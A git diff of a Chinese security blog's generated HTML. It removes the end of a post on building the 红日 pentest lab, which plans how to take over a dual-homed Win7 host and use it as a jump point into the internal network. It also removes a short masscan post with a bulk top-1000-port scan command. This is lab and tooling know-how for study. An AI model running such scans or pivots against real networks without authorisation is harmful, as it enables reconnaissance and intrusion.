-<p>注：不要去ping win7，因为防火墙默认禁ping的关系，无论网络是否联通，win7都是ping不到的，它的ping测试结果没有参考意义。</p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来说，红日靶场就是三台虚拟机</p>
-<p>win7是门户、内外网边界，有双网卡，既联通外网192.168.11.0，又联通内网192.168.52.0</p>
-<p>win 2k3和win 2008是纯内网，不与外网联通，外网无法直接访问到这两台服务器</p>
-<p>mac是攻击机，是外来访问设备，只能访问win7提供的网络服务，而无法接触到192.168.52.0网段，即内网。</p>
-<p>而在实际环境搭建过程中，win7以nat方式与mac联通，mac在vmnet8虚拟网络中，以192.168.11.1的身份存在</p>
-<p>win7的内网网卡，win 2k3，win 2008，以vmnet2虚拟网络联通，而默认情况下，mac也处于这个网络中，以192.168.52.1的身份存在</p>
-<p>因此，只要将mac中，联通vmnet2的虚拟网卡禁用，mac就从vmnet2这个虚拟网络中消失了，而只与win7的nat网卡相连接，存在于vmnet8这个虚拟网络中，以192.168.11.1这个身份存在</p>
-<p>者就复合了红日靶场的拓扑构想，接下来，就可以愉快的以攻击者身份，获得win7的控制权，从而以win7为跳板攻击192.168.52.0内网网段了。</p>
-
+          
       
     </div>
 
@@ -1138,87 +1181,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/01/masscan%E6%89%B9%E9%87%8F%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/07/01/masscan%E6%89%B9%E9%87%8F%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">masscan批量端口扫描工具</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-07-01 10:31:50" itemprop="dateCreated datePublished" datetime="2022-07-01T10:31:50+08:00">2022-07-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">1.工具总结</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">1.信息收集工具</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33608000/article/details/124831900">https://blog.csdn.net/qq_33608000/article/details/124831900</a></p>
-<h3 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h3><p>按文件扫描，扫top1000端口，并且导出为xls文件，并设置线程数为默认（100）10倍</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -iL ip.txt -oL res.xls --top-ports 1000 --rate 1000</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1290,14 +1252,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-count">46</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-count">28</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
@@ -1334,7 +1296,7 @@
   </div>
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共30.2k字</span>
+  <span class="post-count">博客全站共29.4k字</span>
 </div>
 
     <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
